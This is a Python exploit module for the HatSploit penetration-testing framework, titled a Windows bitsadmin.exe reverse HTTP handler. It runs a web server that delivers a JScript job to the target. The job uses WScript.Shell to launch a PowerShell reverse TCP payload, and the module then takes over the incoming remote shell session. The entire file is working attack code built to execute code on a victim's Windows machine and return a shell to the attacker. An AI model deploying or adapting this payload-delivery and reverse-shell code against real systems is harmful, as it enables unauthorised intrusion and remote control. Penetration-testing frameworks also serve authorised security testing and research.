"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handle import Handle
from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from hatsploit.lib.payloads import Payloads


class HatSploitModule(Module, Handle, Payloads, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Windows bitsadmin.exe Reverse HTTP Handler",
            'Module': "exploit/windows/handler/bitsadmin_reverse_http",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Windows bitsadmin.exe reverse HTTP handler.",
            'Platform': "windows",
            'Rank': "high",
        }

        self.payload = {
            'Value': "windows/generic/powershell_reverse_tcp",
            'Architectures': None,
            'Platforms': ['windows'],
            'Actions': ['execute', 'drop'],
            'Types': None,
            'Handler': 'reverse_tcp',
        }

        self.options = {
            'SRVHOST': {
                'Description': "Local host to start HTTP server on.",
                'Value': "0.0.0.0",
                'Type': "ip",
                'Required': True,
            },
            'SRVPORT': {
                'Description': "Local port to start HTTP server on.",
                'Value': 8080,
                'Type': "port",
                'Required': True,
            },
            'URLPATH': {
                'Description': "File path on server.",
                'Value': "/",
                'Type': None,
                'Required': True,
            },
        }

    def serve_bitsadmin(self, server_host, server_port, url_path):
        payload = self.generate_payload(
            "windows/generic/powershell_reverse_tcp",
            {'RHOST': self.handler['RHOST'], 'RPORT': self.handler['RPORT']},
        )['Payload']

        def get(request):
            if request.path == url_path:
                self.print_process("Delivering payload...")

                request.send_response(200)
                request.send_header("Content-type", "text/html")
                request.end_headers()

                request.wfile.write(
                    (
                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
                        "<job id=\"0\">"
                        "    <script language=\"JScript\">"
                        "        <![CDATA["
                        f"            new ActiveXObject(\"WScript.Shell\").Run(\"{payload}\");\n"
                        "        ]]>"
                        "    </script>"
                        "</job>"
                    ).encode()
                )

        self.listen_server(server_host, server_port, {'GET': get})

    def run(self):
        server_host, server_port, url_path = self.parse_options(self.options)
        self.background(self.serve_bitsadmin, [server_host, server_port, url_path])

        remote = self.module_handle_session(self, self.payload['Handler'])

        if remote:
            self.module_handle(self, sender=remote[0].send_command)
            remote[0].close()
